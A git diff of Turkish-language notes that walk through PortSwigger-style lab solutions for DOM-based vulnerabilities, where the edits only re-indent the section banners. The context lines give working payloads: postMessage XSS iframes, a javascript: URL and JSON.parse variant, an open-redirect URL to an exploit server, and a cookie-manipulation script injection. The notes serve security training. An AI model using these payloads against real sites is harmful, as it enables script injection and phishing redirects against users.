@@ -1,8 +1,8 @@
                       DOM-based vulnerabilities
                       DOM tabanlı güvenlik açıkları
-    ################################################
-		#			DOM XSS using web messages               #
-		#			Web mesajlarını kullanan DOM XSS         #
+    		################################################
+		# 	DOM XSS using web messages             #
+		#	Web mesajlarını kullanan DOM XSS       #
 		################################################
 
 1--> anasayfa kaynak kodlarındaki zaafiyetli kod bloğu aşağıdaki gibidir.
@@ -15,9 +15,9 @@
 exploit servere iframe kodu içerisinde postMessage fonksiyonu ile ekleyip kurbana yollayınca payloadımız çalışıyor.
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
 
-    ###########################################################
-		#			DOM XSS using web messages and a JavaScript URL     #
-		#			Web mesajlarını kullanan DOM XSS                    #
+    		###########################################################
+		#	DOM XSS using web messages and a JavaScript URL   #
+		#	Web mesajlarını kullanan DOM XSS                  #
 		###########################################################
 
 2--> anasayfa kaynak kodlarındaki zaafiyetli kod bloğu aşağıdaki gibidir.
@@ -33,9 +33,9 @@ exploit servere iframe kodu içerisinde postMessage fonksiyonu ile ekleyip kurba
 exploit servere iframe kodu içerisinde postMessage fonksiyonu ile ekleyip kurbana yollayınca payloadımız çalışıyor.
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
 
-    ##########################################################
-		#			DOM XSS using web messages and JSON.parse          #
-		#			Web mesajlarını kullanan DOM XSS ve JSON.parse     #
+    		##########################################################
+		#	DOM XSS using web messages and JSON.parse        #
+		#	Web mesajlarını kullanan DOM XSS ve JSON.parse   #
 		##########################################################
 
 3--> anasayfa kaynak kodlarındaki zaafiyetli kod bloğu aşağıdaki gibidir.
@@ -66,9 +66,9 @@ exploit servere iframe kodu içerisinde postMessage fonksiyonu ile ekleyip kurba
 exploit servere iframe kodu içerisinde postMessage fonksiyonu ile ekleyip kurbana yollayınca payloadımız çalışıyor.
 <iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
 
-    ##########################################
-		#			DOM-based open redirection         #
-		#			DOM tabanlı açık yönlendirme       #
+   	 	##########################################
+		#	DOM-based open redirection       #
+		#	DOM tabanlı açık yönlendirme     #
 		##########################################
 
 4--> blog yazısında bloğun anasayfasına dönmeye çalışan zaafiyetli kodlar aşağıdaki gibidir.
@@ -78,9 +78,9 @@ Parametre, url"Blog'a Geri Dön" bağlantısının kullanıcıyı götürdüğü
 urlden yapıştırıp back to blog linkine tıklayınca çalışıyor.
 https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
 
-    ##########################################
-		#			DOM-based cookie manipulation      #
-		#			DOM tabanlı çerez manipülasyonu    #
+   		##########################################
+		#	DOM-based cookie manipulation    #
+		#	DOM tabanlı çerez manipülasyonu  #
 		##########################################
 
 5--> view details kısmına girildiğinde sayfa kodlarında aşağıdaki zafiyetli kod bloğuyla karşılaşıyoruz.
@@ -91,9 +91,9 @@ https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPL
 aşağıdaki istismarı store edip deliver to victim yapınca exploit server üzerinden sonuca ulaşıyoruz.
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
 
-    #######################################################################
-		#			Exploiting DOM clobbering to enable XSS                         #
-		#			XSS'yi etkinleştirmek için DOM hırsızlığından yararlanma        #
+    		#######################################################################
+		#	Exploiting DOM clobbering to enable XSS                       #
+		#	XSS'yi etkinleştirmek için DOM hırsızlığından yararlanma      #
 		#######################################################################
 
 6--> bloga yorum olarak ilk aşağıdaki exploiti yapıştırıp yorum atıyoruz.
@@ -103,9 +103,9 @@ sonra ikinci defa normal yorum atıp sonuca ulaşıyoruz.
 Burada zaafiyetin kaynaklandığı kod bloğu içe javascript dosyası aktarıyor ve yorumu javascript dosyasında çalıştırdığı için exploit gerçekleşiyor.
 <script>loadComments('/post/comment')</script>
 
-    #######################################################################
-		#			Clobbering DOM attributes to bypass HTML filters                #
-		#			HTML filtrelerini atlamak için DOM niteliklerini gizleme        #
+    		#######################################################################
+		#	Clobbering DOM attributes to bypass HTML filters              #
+		#	HTML filtrelerini atlamak için DOM niteliklerini gizleme      #
 		#######################################################################
 
 7--> Blog gönderilerinden birine gidin ve aşağıdaki HTML'yi içeren bir yorum oluşturun:
